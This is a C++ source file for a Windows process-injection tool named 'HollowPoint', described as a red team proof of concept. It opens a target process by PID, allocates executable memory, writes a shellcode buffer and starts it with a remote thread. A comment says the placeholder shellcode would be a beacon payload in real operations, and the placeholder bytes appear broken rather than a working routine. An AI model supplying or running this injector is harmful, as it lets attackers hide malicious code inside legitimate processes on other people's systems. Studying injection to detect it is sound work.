#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <iostream>
#include <vector>

// HollowPoint - Process Injection Tool for Red Team Operations
// Educational Proof-of-Concept
// Usage: HollowPoint.exe <PID>

// Simple MessageBox Shellcode (x64) - "Hello"
unsigned char buf[] = 
"\x48\x83\xEC\x28\x48\xB9\x75\x73\x65\x72\x33\x32\x2E\x64\x6C\x6C\x48\xC7\xC2\x00\x00\x00\x00\x48\x8B\x11\x48\x89\x14\x24\x48\xC7\xC1\x00\x00\x00\x00\xFF\x15\x00\x00\x00\x00\x48\x83\xC4\x28\xC3";
// Note: This is just a placeholder. In real ops, this would be your beacon payload.

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("HollowPoint - Process Injection Utility\n");
        printf("Usage: HollowPoint.exe <TargetPID>\n");
        return 1;
    }

    int targetPID = atoi(argv[1]);
    printf("[*] Targeting Process ID: %d\n", targetPID);

    // 1. Open Target Process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
    if (hProcess == NULL) {
        printf("[-] Failed to open process. Error: %d\n", GetLastError());
        return 1;
    }
    printf("[+] Process opened successfully.\n");

    // 2. Allocate Memory
    LPVOID pRemoteCode = VirtualAllocEx(hProcess, NULL, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (pRemoteCode == NULL) {
        printf("[-] Memory allocation failed. Error: %d\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Memory allocated at: %p\n", pRemoteCode);

    // 3. Write Payload
    SIZE_T bytesWritten;
    BOOL bWrite = WriteProcessMemory(hProcess, pRemoteCode, buf, sizeof(buf), &bytesWritten);
    if (!bWrite) {
        printf("[-] Failed to write memory. Error: %d\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Payload written (%lld bytes).\n", bytesWritten);

    // 4. Execute (CreateRemoteThread)
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("[-] Thread creation failed. Error: %d\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    printf("[+] Remote thread created! Check the target process.\n");

    // Cleanup
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}
